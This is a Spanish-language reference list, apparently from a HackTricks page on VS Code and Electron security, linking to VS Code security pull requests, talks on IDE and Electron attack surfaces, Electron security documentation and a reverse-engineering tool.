- [16] [PR n.º 319705 de VS Code: confirmar la apertura de notebooks y dejar de aceptar el contexto installExtension proporcionado por quien realiza la llamada](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR n.º 319813 de VS Code: bloquear la redistribución programática de eventos keypress/click de webview en los webviews de notebooks](https://github.com/microsoft/vscode/pull/319813)
- [18] [VS Code 1.89 / extensiones de workspace local](https://code.visualstudio.com/updates/v1_89#_local-workspace-extensions)
- [19] [APPSEC Cali 2018 - MarkDoom: cómo hackeé todos los IDE principales en 2 semanas](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [20] [ElectroVolt: Pwning aplicaciones de escritorio populares mientras se descubre una nueva superficie de ataque en Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [21] [Seguridad de Electron](https://www.electronjs.org/docs/latest/tutorial/security)
- [22] [webPreferences de BrowserWindow de Electron](https://www.electronjs.org/docs/latest/api/browser-window#new-browserwindowoptions)
- [23] [REA: ingeniería inversa de cualquier cosa](https://github.com/morluto/rea)
- [24] [Reconstrucción de artefactos JavaScript con REA](https://github.com/morluto/rea/blob/main/docs/javascript-artifact-reconstruction.md)
- [25] [Flujos de trabajo de aplicaciones JavaScript entre capas con REA](https://github.com/morluto/rea/blob/main/docs/javascript-application-workflows.md)
{{#include ../../banners/hacktricks-training.md}}
